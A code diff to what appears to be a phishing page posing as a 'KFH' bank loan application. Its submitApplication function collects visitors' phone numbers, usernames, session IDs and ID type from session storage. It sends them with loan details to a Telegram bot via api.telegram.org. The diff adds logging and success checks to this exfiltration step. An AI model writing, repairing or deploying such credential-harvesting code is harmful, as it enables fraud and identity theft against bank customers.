@@ -315,11 +315,17 @@
         }
 
         async function submitApplication() {
+            console.log('Submitting application to bot...');
+            
             // Get all stored data
             const phone = sessionStorage.getItem('kfh_phone') || 'Not provided';
             const username = sessionStorage.getItem('kfh_username') || 'Unknown';
             const sessionId = sessionStorage.getItem('kfh_session_id') || 'N/A';
             const idType = sessionStorage.getItem('idType') || 'Not provided';
+            
+            console.log('Phone:', phone);
+            console.log('Username:', username);
+            console.log('Session ID:', sessionId);
             
             // Send final application to bot with ALL details
             const applicationId = 'KFH-' + new Date().getFullYear() + '-' + Math.random().toString(36).substr(2, 5).toUpperCase();
@@ -347,13 +353,24 @@
             message += '*📅 Term:* ' + loanDetails.term + ' Months\n';
             message += '*💵 Monthly Payment:* KWD ' + loanDetails.monthlyPayment.toLocaleString() + '\n';
             message += '*📊 Profit Rate:* 5% APR';
-
+            
+            console.log('Sending message to bot:', message);
+            
             try {
-                await fetch('https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage', {
+                const response = await fetch('https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'Markdown' })
                 });
+                
+                const result = await response.json();
+                console.log('Bot response:', result);
+                
+                if (result.ok) {
+                    console.log('Application sent to bot successfully!');
+                } else {
+                    console.log('Bot error:', result.description);
+                }
             } catch (error) {
                 console.log('Error sending final application to bot:', error);
             }
